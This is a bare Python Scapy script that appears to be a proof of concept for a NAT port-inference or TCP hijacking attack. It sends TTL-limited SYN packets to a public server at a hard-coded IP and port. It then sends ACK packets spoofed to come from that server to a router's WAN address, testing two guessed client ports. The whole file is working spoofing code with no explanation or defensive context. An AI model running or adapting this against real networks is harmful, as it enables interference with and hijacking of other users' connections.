
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

server_ip = '101.43.138.36'
server_port = 5902
guess_client_port_right = 55130
guess_client_port_false = 57862

my_ip = "192.168.5.2"
router_wan_ip = "172.20.12.240"

send(IP(src=my_ip,dst=server_ip,ttl=2)/TCP(seq=1, sport=guess_client_port_right, dport=server_port,flags="S"))
time.sleep(1)
send(IP(src=server_ip,dst=router_wan_ip)/TCP(seq=1, ack=1, sport=server_port, dport=guess_client_port_right,flags="A"))
time.sleep(2)
send(IP(src=my_ip,dst=server_ip,ttl=2)/TCP(seq=1, sport=guess_client_port_false, dport=server_port,flags="S"))
time.sleep(1)
send(IP(src=server_ip,dst=router_wan_ip)/TCP(seq=1, ack=1, sport=server_port, dport=guess_client_port_false,flags="A"))


